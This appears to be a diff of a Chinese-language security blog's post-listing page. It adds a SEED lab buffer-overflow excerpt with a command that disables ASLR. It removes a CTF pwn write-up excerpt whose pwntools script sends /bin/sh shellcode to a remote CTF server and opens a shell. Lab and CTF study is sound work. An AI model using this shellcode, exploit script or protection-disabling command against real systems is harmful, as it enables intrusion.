@@ -186,6 +186,20 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">SEEDlab—缓冲区溢出漏洞
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>环境设置 关闭反制措施 地址空间布局随机化 地址空间布局随机化：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。
+使用命令sudo sysctl -w kernel.randomize_va_space=0来关闭地址空间布局随机化。
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-01-12 00:00:00 +0000 UTC'>一月 12, 2025</span>&nbsp;·&nbsp;11 分钟&nbsp;·&nbsp;Mi Yu</footer>
+  <a class="entry-link" aria-label="post link to SEEDlab—缓冲区溢出漏洞" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">SEEDlab—跨站脚本（XSS）攻击实验
     </h2>
   </header>
@@ -252,20 +266,6 @@ Secret of Keyboard 签到脚本题，有些同学的脚本解出来大小写不�
   </div>
   <footer class="entry-footer"><span title='2024-04-24 00:00:00 +0000 UTC'>四月 24, 2024</span>&nbsp;·&nbsp;4 分钟&nbsp;·&nbsp;Mi Yu</footer>
   <a class="entry-link" aria-label="post link to HASHCTF2024 题解" href="https://smera1d0.github.io/posts/hashctf2024-%E9%A2%98%E8%A7%A3/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Newstar CTF 2023 pwn
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>1.ezshellcode 直接sendline(shellcode)即可 exp：
-from pwn import * p = remote(&#34;node4.buuoj.cn&#34;,29374) #p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;) context(log_level = &#39;debug&#39;, arch = &#39;amd64&#39;, os = &#39;linux&#39;) shellcode=asm(shellcraft.sh()) #shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39; payload = shellcode p.sendlineafter(&#39;Show me your magic\n&#39;,payload) p.interactive() pwntools生成的shellcode和\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05都能过
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2023-10-17 00:00:00 +0000 UTC'>十月 17, 2023</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to Newstar CTF 2023 pwn" href="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
